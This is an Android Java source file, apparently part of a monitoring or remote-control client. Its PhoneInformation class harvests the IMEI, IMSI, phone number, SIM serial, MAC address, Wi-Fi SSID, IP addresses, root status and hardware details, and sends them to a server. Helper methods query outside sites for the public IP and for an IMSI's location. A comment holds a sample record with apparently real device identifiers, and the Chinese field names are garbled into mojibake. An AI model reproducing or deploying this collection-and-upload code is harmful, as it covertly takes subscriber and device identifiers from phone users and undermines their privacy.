package com.phone.data;

import com.main.GSBroadcastReceiver;
import com.network.SendDataToServer;
import com.utils.ExceptionProcess;
import com.utils.HttpUtils;
import com.utils.Public;
import com.utils.PublicFunction;
import com.utils.WriteDateFile;
import java.io.BufferedReader;

import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.Calendar;
import java.util.Enumeration;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import org.json.JSONObject;
import android.annotation.SuppressLint;
import android.annotation.TargetApi;
import android.app.ActivityManager;
import android.app.ActivityManager.MemoryInfo;
import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Point;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.text.format.Formatter;
import android.util.Log;
import android.view.Display;
import android.view.WindowManager;
import com.root.*;;

@TargetApi(Build.VERSION_CODES.DONUT) 
public class PhoneInformation implements Runnable{

	private final static String TAG = "PhoneInformation";
	static String cpuDescription = "";
	static String []imsi = new String[2];
	static String []imei = new String[2];
	static String []phone = new String[2];
	static String deviceVer = "";
	static String phoneType = "";
	static String availableMem = "";
	static String totalMem = "";
	static String androidModel = "";
	static String simNumber = "";
	static String simState = "";
	static String subscriberId = "";
	static String voiceMailNumber = "";
	static String countryCode = "";
	static String simnetwork = "";
	static String simnetworkName = "";
	static String simnetworkType = "";
	static String screenheight = "";
	static String screenwidth = "";
	static String mac ="";
	static String ip = "";
	static String netip = "";
	static String verCode;
	static String wifiName = "";
	static String appListString = "";
	static String androidBrand = android.os.Build.BRAND;
	static int androidapiversion = android.os.Build.VERSION.SDK_INT;
	static String androidversion = android.os.Build.VERSION.RELEASE;
	static String deviceID = android.os.Build.ID;
	static String kernelversion;
	static String basebandversion;
	static long devicetime = android .os.Build.TIME;
	static String productname = android .os.Build.PRODUCT;
	static String fingerprint = android.os.Build.FINGERPRINT;
	static String display = android.os.Build.DISPLAY;
	private Context context;

	
	public PhoneInformation(Context context){
		this.context = context;
	}
	
	
	public void run(){
		String phoneinfo = getPhoneInfo(context);
    	if (phoneinfo != null && phoneinfo.equals("") == false ) {
	    	SendDataToServer.sendDataToServer(phoneinfo.getBytes(), phoneinfo.getBytes().length,
	    			Public.CMD_DATA_DEVICEINFO, Public.IMEI);
	    	Log.e(TAG,phoneinfo);
    	}
	}
	
	
/*
{\"IMEI0\":\"A000004F931A45\",\"�ͺ�\":\"Che1-CL10 package:com.tencent.mm\",\"sim��״̬\":\"5\",\"�̱�\":\"Honor\",\"�ֻ�����1\":\"\",\"�豸�汾\":\"0\",\"��������\":\"0\",\"�����Ϣ\":\" ���������ɻ�ȡ\",\"SD������\":\"4.05GB\",\"ϵͳ�������ʱ��\":\"2015-11-13 09:50:59\",\"����\":\"CN\",\"����IP��ַ\":\"\",\"MAC��ַ\":\"84:DB:AC:B6:AC:C8\",\"API�汾\":19,\"������\":\"HUAWEI\",\"IP��ַ\":\"172.27.35.3\",\"SDʣ������\":\"1.07GB\",\"���ڴ�\":\"1.87GB\",\"sim����\":\"89860316055710152848\",\"ָ��\":\"Honor/Che1-CL10/Che1:4.4.4/Che1-CL10/C92B283:user/ota-rel-keys,release-keys\",\"IMSI0\":\"\",\"Kernel�汾\":\"3.10.28-g484075f\",\"�ֱ���\":\"720*1280\",\"���к�\":\"84dbacb6b308\",\"����\":\"wifi\",\"�����ڴ�\":\"472MB\",\"cpu��Ϣ\":\"processor\\t: 0\",\"��������\":\"���޽�������\",\"������ʱ��\":\"����ʱ��:192ʱ47��56��\",\"�汾\":\"4.4.4\",\"USER\":\"huawei\",\"��Ļ\":\"Che1-CL10V100R001CHNC92B283\",\"�豸ID\":\"Che1-CL10\",\"��������״̬\":0,\"��Ʒ����\":\"Che1-CL10\",\"�Ƿ�����\":\"false\",\"android ID\":\"cab8462d329b3a4a\",\"�����汾\":\"11060045\",\"WIFI\":\"�շ�wifi\",\"��Ӫ��\":\"\"}
 */

	@TargetApi(Build.VERSION_CODES.GINGERBREAD) @SuppressLint("InlinedApi") 
	public static String getPhoneInfo(Context context) {
		Log.e(TAG,"start");
		//String ret = "";

		JSONObject jsojbj=new JSONObject();
		
		try{
			String networkroaming = ""; 
			int netdatastate = 0;
					
		   	String android_id = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);
	    	kernelversion = getKernelVersion();
	    	basebandversion = getBaseBandVersion();
	    	String strrefreshtime = PublicFunction.formatDate("yyyy-MM-dd HH:mm:ss",devicetime);
	    	
	    	String procname = PublicFunction.getProcessName(context);
	        androidModel = android.os.Build.MODEL + "(" + procname +")"; 
	        
	        try{
		    	cpuDescription = getCpuInfo();
		        availableMem = getAvailableMemory(context);
		        totalMem = getTotalMemory(context);
		        getHeightAndWidth( context);
		        verCode = getVerCode(context);
	        }catch(Exception ex){
	        	ex.printStackTrace();
	        }


	        try {
		        TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
		        phoneType = String.valueOf(tm.getPhoneType());
			   	deviceVer = tm.getDeviceSoftwareVersion();
			   	simnetworkName = tm.getNetworkOperatorName();
			   	simNumber = tm.getSimSerialNumber();
			   	countryCode = tm.getNetworkCountryIso();
			   	if(countryCode == null || countryCode.equals("")){
			   		countryCode = "CN";
			   	}
			   	simnetwork = tm.getNetworkOperator();
			   	simnetworkType = String.valueOf(tm.getNetworkType());

		        simState = String.valueOf(tm.getSimState());
		        subscriberId = tm.getSubscriberId();
		        voiceMailNumber = tm.getVoiceMailNumber();
		        
		        networkroaming = String.valueOf(tm.isNetworkRoaming());
		        netdatastate = tm.getDataState();
		        
			   	phone[0] = tm.getLine1Number();
			   	imei[0] = tm.getDeviceId();
			   	imsi[0] = tm.getSubscriberId();
			   	
			} catch (Exception e) {
				e.printStackTrace();
			}

	        /*
	         * android 9.0 need permission to get wifi ssid
	        <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
			<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
			<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
			
			below android 9.0 need permission:
			<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 			<uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
	        */
	    	try {
//	    		if(Build.VERSION.SDK_INT >= 26){
//	    			ConnectivityManager connManager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
//	                //assert connManager != null;
//	                NetworkInfo networkInfo = connManager.getActiveNetworkInfo();
//	                if (networkInfo.isConnected()) {
//	                    if (networkInfo.getExtraInfo()!=null){
//	                        return networkInfo.getExtraInfo().replace("\"","");
//	                    }
//	                }
//	    		}else{
			        WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
			        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
			        wifiName = wifiInfo.getSSID();
//	    		}
			} catch (Exception e) {
				e.printStackTrace();
			}

	        /*
	        mac = wifiInfo.getMacAddress();
	        int ipaddr = wifiInfo.getIpAddress();
	    	if (ipaddr != 0) {
	    		wifiip = ((ipaddr & 0xff) + "." + (ipaddr >> 8 & 0xff) + "." 
	 			+ (ipaddr >> 16 & 0xff) + "." + (ipaddr >> 24 & 0xff));
	    	}
	    	*/
	    	
	        try{
		    	ip = getIPAddress(context);
		    	mac = getMacAddress();
	        }catch(Exception ex){
	        	ex.printStackTrace();
	        }


	        try {
		        netip = getInetIpAddr(context);
		        if (netip == "") {
					netip = getNetIPFromChinaz(context);
				}
			} catch (Exception e) {
				e.printStackTrace();
			}

		
//		   	try{
//				if(VERSION.SDK_INT>= 21){
//					Class<? extends TelephonyManager> clazz = tm.getClass();
//					Method getImei=clazz.getDeclaredMethod("getImei",int.class);
//					imei[0]=(String)getImei.invoke(tm, 0);
//					if(imei[0]!= null){
//						imei[1]=(String)getImei.invoke(tm, 1);
//						if(imei[1]!= null && imei[1].equals("") == false){
//							if(imei[0].equals(imei[1])){
//								imei[1] = "";
//							}
//						}
//					}
//					
//					Method getImsi=clazz.getDeclaredMethod("getSubscriberId",int.class);
//					imsi[0]=(String)getImsi.invoke(tm, 0);
//					if(imsi[0] != null){
//						imsi[1]=(String)getImsi.invoke(tm, 1);
//						if(imsi[1]!= null && imsi[1].equals("") == false){
//							if(imsi[0].equals(imsi[1])){
//								imsi[1] = "";
//							}
//						}
//					}
//							
//					Method getPhoneNumber=clazz.getDeclaredMethod("getLine1NumberForSubscriber",int.class);
//					phone[0]=(String)getPhoneNumber.invoke(tm, 0);
//					phone[1]=(String)getPhoneNumber.invoke(tm, 1);
//					if(phone[1] != null && phone[0] != null){
//						if(phone[0].equals(phone[1])){
//							phone[1] = "";
//						}
//					}
//				}
//		   	}catch(Exception e){
//				e.printStackTrace();
//				String error = ExceptionProcess.getExceptionDetail(e);
//				String stack = ExceptionProcess.getCallStack();
//				WriteDateFile.writeLogFile("phone imei imsi phone exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
//		   	}


	        jsojbj.put("IMEI0", imei[0]);
	        jsojbj.put("�ͺ�", androidModel);
	        jsojbj.put("sim��״̬", simState);
	        jsojbj.put("�̱�", androidBrand);
	        jsojbj.put("�ֻ�����1", phone[0]);
	        jsojbj.put("�豸�汾", deviceVer);
	        jsojbj.put("��������", simnetworkType);
	        jsojbj.put("�����Ϣ", getBattery(context));

	        jsojbj.put("ϵͳ�������ʱ��", strrefreshtime);
	        jsojbj.put("SD������", getSDTotalSize(context));
	        jsojbj.put("����", countryCode);
	        jsojbj.put("root", String.valueOf(RootAndroid.checkRootPathSU()));
	        jsojbj.put("����IP��ַ", netip);
	        
	        jsojbj.put("API�汾", androidapiversion);
	        jsojbj.put("MAC��ַ", mac);
	        jsojbj.put("������", android.os.Build.MANUFACTURER);
	        jsojbj.put("IP��ַ", ip);
	        jsojbj.put("SDʣ������", getSDAvailableSize(context));
	        jsojbj.put("���ڴ�", totalMem);

	        jsojbj.put("sim����", simNumber);
	        jsojbj.put("ָ��", fingerprint);
	        jsojbj.put("IMSI0", imsi[0]);
	        jsojbj.put("Kernel�汾", kernelversion);
	        jsojbj.put("�ֱ���", screenwidth + "*" + screenheight);
	        jsojbj.put("���к�", android.os.Build.SERIAL);
	    	if (Public.gOnlineType == 8) {
	    		jsojbj.put("����", "wifi");
			}else if (Public.gOnlineType == 4) {
				jsojbj.put("����", "wireless");
			}else{
				jsojbj.put("����", "unknown");
			}
	    	
	        jsojbj.put("�����ڴ�", availableMem);
	        jsojbj.put("cpu��Ϣ", cpuDescription);
	        jsojbj.put("��������", simnetworkName);
	    	jsojbj.put("�汾", androidversion);
	    	jsojbj.put("������ʱ��", getBootTime());
	    	jsojbj.put("USER", android.os.Build.USER);
	    	jsojbj.put("��Ļ", display);
	    	jsojbj.put("�豸ID", deviceID);
	    	jsojbj.put("��Ʒ����", productname);
	    	jsojbj.put("��������״̬", netdatastate);
	    	jsojbj.put("�Ƿ�����", networkroaming);
	    	jsojbj.put("android ID", android_id);
	    	jsojbj.put("�����汾", basebandversion);
	    	jsojbj.put("��Ӫ��", subscriberId);
	    	jsojbj.put("WIFI", wifiName);
	        
	    	
	    	jsojbj.put("IMEI1", imei[1]);
	    	jsojbj.put("IMSI1", imsi[1]);
	    	jsojbj.put("�ֻ�����2", phone[1]);
	    	jsojbj.put("��������", voiceMailNumber);
	    	
	    	/*
	        ret = 
	        "�ֻ��ͺ�:" + androidModel + "\r\n" + 
	        "�豸�̱�:" + androidBrand  + "\r\n"+ 
	        "Android�汾:" + androidversion + "\r\n" + 
	        "API�汾:" + androidapiversion + "\r\n" + 
	        "ϵͳ�������ʱ��:" + strdevicetime + "\r\n" +
			"��Ʒ����:" + productname + "\r\n" +
			"�豸ָ��:" + fingerprint + "\r\n"+ 
			"��Ļ��ʾ:" + display + "\r\n" +
			//"ʱ��:" + ByteArrayProcess.formatDate("yyyy-MM-dd hh:MM:ss", android.os.Build.TIME) + "\r\n" +
	        "�豸������:" + android.os.Build.MANUFACTURER + "\r\n" + 
	        "���к�:" + android.os.Build.SERIAL + "\r\n" + 
	        "USER:" + android.os.Build.USER + "\r\n" +
	        "�豸ID:" + deviceID + "\r\n" + 
	        "�豸�汾:" + deviceVer + "\r\n" +
	        "Kernel�汾:" + kernelversion + "\r\n" +	
	        "�����汾:" + basebandversion + "\r\n" + 
			"cpu��Ϣ:" + cpuDescription + "\r\n" +
			"���ڴ��С:" + totalMem + "\r\n" +
	        "�����ڴ��С:" + availableMem  + "\r\n"+ 
	        "��Ļ�ֱ���:" + width + "*" + height + "\r\n" +
			"SD������:" + getSDTotalSize(context) + "\r\n" + 
	        "SD��ʣ������:" + getSDAvailableSize(context) + "\r\n" +
	        getBattery(context) +
	        getBootTime() + 
	        "IMEI0:" + imei[0] + " IMEI1:" + imei[1]+ "\r\n"+ 
	        "IMSI0:" + imsi[0] + " IMSI1:"+imsi[1] + "\r\n" + 
	        "Phone0:" + phone[0] + " Phone1:"+ phone[1] + "\r\n" + 
	        "sim����:" + simNumber + " sim��״̬:" + simState + "\r\n" + 
	        "����:" + network + " ��������:" + networkName + " ��������:" + networkType + " �Ƿ�����:"+ tm.isNetworkRoaming() +" ��������״̬:" + tm.getDataState()+"\r\n" + 
	        "����:" + countryCode + " ��������:" + voiceMailNumber + " ��Ӫ��:" + subscriberId + "\r\n" +
	        "MAC��ַ:" + mac + "\r\n" + 
	        "IP��ַ:" + ip + "\r\n" + 
	        "����IP��ַ:" + getMobileV4IP() + "\r\n" +
	        "��ǰ���ӵ�wifi����:" + wifiName + "\r\n\r\n";
	        */

		}catch(Exception ex){
			ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("phone information exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		}

		return jsojbj.toString();
		//return ret;
    }

	
	
	public static String getAndroidID(Context context){
		String androidId = Secure.getString(context.getContentResolver(), Secure.ANDROID_ID);
		return androidId;
	}
	

	/*��ȡmac��ַ��һ����Ҫע��ľ���android 6.0�汾������ע�ͷ����������ã������κ��ֻ����᷵��"02:00:00:00:00:00"���Ĭ�ϵ�mac��ַ��
	 ����googel�ٷ�Ϊ�˼�ǿȨ�޹����������getSYstemService(Context.WIFI_SERVICE)���������mac��ַ��
	String macAddress= "";
	WifiManager wifiManager = (WifiManager) MyApp.getContext().getSystemService(Context.WIFI_SERVICE);
	WifiInfo wifiInfo = wifiManager.getConnectionInfo();
	macAddress = wifiInfo.getMacAddress();
	return macAddress;
	*/
	public static String getMacAddress(){
	    NetworkInterface ethni = null;
	    NetworkInterface wifini = null;
	    StringBuffer ethaddrbuf = new StringBuffer();
	    StringBuffer wifiaddrbuf = new StringBuffer();
	    try {
	    	ethni = NetworkInterface.getByName("eth1");
	    	
			if (ethni != null ) {
				byte[] addr = ethni.getHardwareAddress();
				
				for (byte b : addr) {
					ethaddrbuf.append(String.format("%02X:", b));
			    }
			    if (ethaddrbuf.length() > 0) {
			    	ethaddrbuf.deleteCharAt(ethaddrbuf.length() - 1);
			    }
			}
//			else{
//				ethni = NetworkInterface.getByName("eth0");
//				byte[] addr = ethni.getHardwareAddress();
//				
//				for (byte b : addr) {
//					ethaddrbuf.append(String.format("%02X:", b));
//			    }
//			    if (ethaddrbuf.length() > 0) {
//			    	ethaddrbuf.deleteCharAt(ethaddrbuf.length() - 1);
//			    }
//			}
			
			wifini = NetworkInterface.getByName("wlan0");
			if (wifini != null) {
				byte[] addr = wifini.getHardwareAddress();
				
				for (byte b : addr) {
					wifiaddrbuf.append(String.format("%02X:", b));
			    }
			    if (wifiaddrbuf.length() > 0) {
			    	wifiaddrbuf.deleteCharAt(wifiaddrbuf.length() - 1);
			    }
			}
			
			String ret = "";
			if (wifiaddrbuf.toString().equals("") == false) {
				ret = ret + "(WIFI MAC)" + wifiaddrbuf.toString() + " ";
			}
			
			if(ethaddrbuf.toString().equals("") == false){
				ret = ret + "(mobile MAC)" + ethaddrbuf.toString() + " ";
			}
			
			return ret;
		} catch (SocketException ex) {
		    ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getMacAddress exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
		    return "02:00:00:00:00:02";
		}
	}
	
	

	
	
    public static String getIPAddress(Context context) {
    	try {
	        NetworkInfo info = ((ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
	        if (info != null && info.isConnected()) {
	            if (info.getType() == ConnectivityManager.TYPE_MOBILE) {
	                
	                //Enumeration<NetworkInterface> en=NetworkInterface.getNetworkInterfaces();
	                for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
	                    NetworkInterface ni = en.nextElement();
	                    for (Enumeration<InetAddress> enumIpAddr = ni.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
	                        InetAddress inetAddress = enumIpAddr.nextElement();
	                        
	                        if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
	                            return inetAddress.getHostAddress();
	                        }
	                    }
	                }
	            } else if (info.getType() == ConnectivityManager.TYPE_WIFI) {
	                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
	                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
	                String ipAddress = PublicFunction.intIP2StringIP(wifiInfo.getIpAddress());
	                return "(wifi)" + ipAddress;
	            }
	        } else {
	        	return "��ǰ����������";
	        }
    	}catch(Exception ex){
    		ex.printStackTrace();
			String error = ExceptionProcess.getExceptionDetail(ex);
			String stack = ExceptionProcess.getCallStack();
			WriteDateFile.writeLogFile("getIPAddress exception:"+error + "\r\n" + "call stack:" + stack + "\r\n");
    		return null;
    	}
    	return null;
    }
	
	public static void getHeightAndWidth(Context context){
        WindowManager wm = (WindowManager)context.getSystemService(Context.WINDOW_SERVICE);
        Display display = wm.getDefaultDisplay();
        Point point = new Point();
        display.getSize(point);
        screenwidth = String.valueOf(point.x);
        screenheight = String.valueOf(point.y);
        return;
	}
	
	
	
    public static String getVerCode(Context context) {
    	String verCode = "";
        try {
            String packageName = context.getPackageName();
            verCode = String.valueOf(context.getPackageManager().getPackageInfo(packageName, 0).versionCode);
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
            return "";
        }
        return verCode;
    }

	
	private static String getCpuInfo() {
        String strfilename = "/proc/cpuinfo";
        String temp = "";
        String cpuinfo = "";
        try {
            FileReader fr = new FileReader(strfilename);
            BufferedReader localBufferedReader = new BufferedReader(fr, 4096);
            while((temp = localBufferedReader.readLine()) != null){
            	temp = temp.replace("Processor\\t: ", "");

            	temp = temp.replace("\\", "");
            	temp = temp.replace(":", "");
            	temp = temp.replace("\"", "");
            	temp = temp.replace("\'", "");
            	temp = temp.replace("\t", "");
            	temp = temp.replace("\r", "");
            	temp = temp.replace("\n", "");
            	cpuinfo = cpuinfo + temp;
            	break;
            }
            
            //temp = localBufferedReader.readLine();
            //arrayOfString = temp.split("\\s+");
            //for (int i = 2; i < arrayOfString.length; i++) {
            //	cpuDescription = cpuDescription + arrayOfString[i] + " ";
            //}
            
            //temp = localBufferedReader.readLine();
            //arrayOfString = temp.split("\\s+");
            //cpuFrequence += arrayOfString[2];

            localBufferedReader.close();
            return cpuinfo;
        } catch (IOException e) {
        	return "";
        }
    }
	
	private static String getAvailableMemory(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);  
        MemoryInfo mi = new MemoryInfo();  
        am.getMemoryInfo(mi);  
        return Formatter.formatFileSize(context, mi.availMem);
    }  


	private static String getTotalMemory(Context context) {
        ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);  
        MemoryInfo mi = new MemoryInfo();  
        am.getMemoryInfo(mi);  
        return Formatter.formatFileSize(context, mi.totalMem);
		
		/*
		String filename = "/proc/meminfo";
		String info;
		String[] arrayOfString;
		long initial_memory = 0;

		try {
			FileReader localFileReader = new FileReader(filename);
			BufferedReader localBufferedReader = new BufferedReader(
			localFileReader, 8192);
			info = localBufferedReader.readLine();// ��ȡmeminfo��һ�У�ϵͳ���ڴ��С 
	
			arrayOfString = info.split("\\s+");
			for (String num : arrayOfString) {
				Log.i(info, num + "\t");
			}
	
			initial_memory = Integer.valueOf(arrayOfString[1]).longValue() * 1024;// ���ϵͳ���ڴ棬��λ��KB������1024ת��ΪByte 
			localBufferedReader.close();

		} catch (IOException e) {
			return "";
		}
		return Formatter.formatFileSize(context, initial_memory);// Byteת��ΪKB����MB���ڴ��С��� 
		*/
	}
	
	

    public static String getBaseBandVersion() {
        String version = "";
            try {
                Class<?> clazz= Class.forName("android.os.SystemProperties");
                Object object = clazz.newInstance();
                Method method = clazz.getMethod("get", new Class[]{String.class, String.class});
                Object result = method.invoke(object, new Object[]{"gsm.version.baseband", "no message"});
                version = (String) result;
            } catch (Exception e) {
            	return version;
        }
        return version;
    }


    public static String getKernelVersion() {
        Process process = null;
        String kernelVersion = "";
        try {
            process = Runtime.getRuntime().exec("cat /proc/version");
        } catch (IOException e) {
            e.printStackTrace();
        }
        InputStream inputStream = process.getInputStream();
        InputStreamReader inputStreamReader = new InputStreamReader(inputStream);
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader, 4096);
        String result = "";
        String info;
        try {
            while ((info = bufferedReader.readLine()) != null) {
            	result += info;
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            if (result != null && result.equals("") == false) {
                String keyword = "version ";
                int index = result.indexOf(keyword);
                info = result.substring(index + keyword.length());
                index = info.indexOf(" ");
                kernelVersion = info.substring(0, index);
            }
        } catch (IndexOutOfBoundsException e) {
            e.printStackTrace();
        }
        return kernelVersion;
    }
    
    
	public static String getSDTotalSize(Context context) {
		File path = Environment.getExternalStorageDirectory();
		StatFs stat = new StatFs(path.getPath());
		@SuppressWarnings("deprecation")
		long blockSize = stat.getBlockSize();
		@SuppressWarnings("deprecation")
		long totalBlocks = stat.getBlockCount();
		return Formatter.formatFileSize(context, blockSize * totalBlocks);
	}


	public static String getSDAvailableSize(Context context) {
		File path = Environment.getExternalStorageDirectory();
		StatFs stat = new StatFs(path.getPath());
		@SuppressWarnings("deprecation")
		long blockSize = stat.getBlockSize();
		@SuppressWarnings("deprecation")
		long availableBlocks = stat.getAvailableBlocks();
		return Formatter.formatFileSize(context, blockSize * availableBlocks);
	}
	

	
	@SuppressLint("InlinedApi") public static String getBattery(Context context){
		
		String batteryinfo = "";
		
		if(GSBroadcastReceiver.batteryPercent != 0){
			batteryinfo =  
					" ������:" + GSBroadcastReceiver.batteryPercent + "%";
		}
		else if (Build.VERSION.SDK_INT >= 21 ) {
			BatteryManager batteryManager=(BatteryManager)context.getSystemService("batterymanager");
			batteryinfo =  "��ص���:" + batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CURRENT_AVERAGE) + 
					" ������:" + batteryManager.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY) + "%";;
		}else{
			batteryinfo =  
					" ���������ɻ�ȡ";
		}

		return batteryinfo;
	}


	public static String getBootTime() {
		String boottime = "";
		if (Build.VERSION.SDK_INT >= 17 ) {
		    long seconds =  SystemClock.elapsedRealtimeNanos() / 1000000000;
		    long hour = seconds/3600;
		    seconds = seconds%3600;
		    long minute = seconds/60;
		    seconds = seconds%60;
		    
		    boottime = "����ʱ��:" + String.valueOf(hour) + "ʱ" + String.valueOf(minute) + "��" + String.valueOf(seconds) + "��";
		}
	    return boottime;
	}

	
	public static String getInetIpAddr(Context context){
		String ipstr = "";
		try {
	        String urlString = "http://icanhazip.com/";	
	        //String urlString = "http://api.ipify.org/";	
	        ipstr = HttpUtils.sendHttpGet(context,"GET",urlString,"", "", "", "");
		} catch (Exception e) {
			e.printStackTrace();
		}

		return ipstr;
	}

	
	
	public static String getNetIPFromIP138(Context context){
		
		String ip = "";
		try{

	        Calendar cale = Calendar.getInstance();  
	        int year = cale.get(Calendar.YEAR);  
	        String stryear = String.valueOf(year);
	        
	        String urlString = "http://" + stryear + ".ip138.com/ic.asp";
	        String ipstr = HttpUtils.sendHttpGet(context,"GET",urlString,"", "", "", "");
			//String ipstr = HttpUtils.sendHttpGet(context,"GET","http://2019.ip138.com/ic.asp","", "", "", "");
			if (ipstr != null) {
				int pos = ipstr.indexOf("<center>");
				if(pos >0){
					ip = ipstr.substring(pos + "<center>".length());
					pos = ip.indexOf("[");
					if (pos > 0) {
						ip = ip.substring(pos + "[".length());
						
						pos = ip.indexOf("</center>");
						if(pos > 0){
							ip = ip.substring(0,pos);
							
							pos = ip.indexOf("]");
							if (pos > 0) {
								ip = ip.substring(0,pos);
							}	
						}	
					}
				}
			}
		}catch(Exception ex){
			ex.printStackTrace();
		}
		return ip;
	}
    
    
    
    
    public static String getNetIPFromChinaz(Context context){
    	String ip="";
    	try{
	    	String result = HttpUtils.sendHttpGet(context,"GET","http://ip.chinaz.com","","","","");
	    			
			Pattern p = Pattern.compile("\\<dd class\\=\"fz24\">(.*?)\\<\\/dd>");
			Matcher m = p.matcher(result.toString());
			if(m.find()){
				String ipstr = m.group(1);
				ip = ipstr;
			}
    	}catch(Exception ex){
    		ex.printStackTrace();
    	}
		return ip;
    }
	

	
	

	
	
	
	public static String getIMSIAddressFromTHEX(Context context,String imsi){
		if (imsi == null || imsi.equals("") == true) {
			return "";
		}
		
		String result = HttpUtils.sendHttpGet(context,"https://the-x.cn/imsi.aspx" + "#" +"imsi=" + imsi,"GET","","","","");
		if(result == null || result.equals("") == true){
			return "";
		}
		int citypos = result.indexOf("\"city\":\"");
		citypos += "\"city\":\"".length();
		String city = result.substring(citypos);
		int cityend = city.indexOf("\"");
		city = city.substring(0,cityend);
		
		int provincepos = result.indexOf("\"province\":\"");
		provincepos += "\"province\":\"".length();
		String province = result.substring(provincepos);
		int provinceend = province.indexOf("\"");
		province = province.substring(0,provinceend);
		
		return province + "ʡ" + city + "��";
	}
	
	
	


	
	
	
}
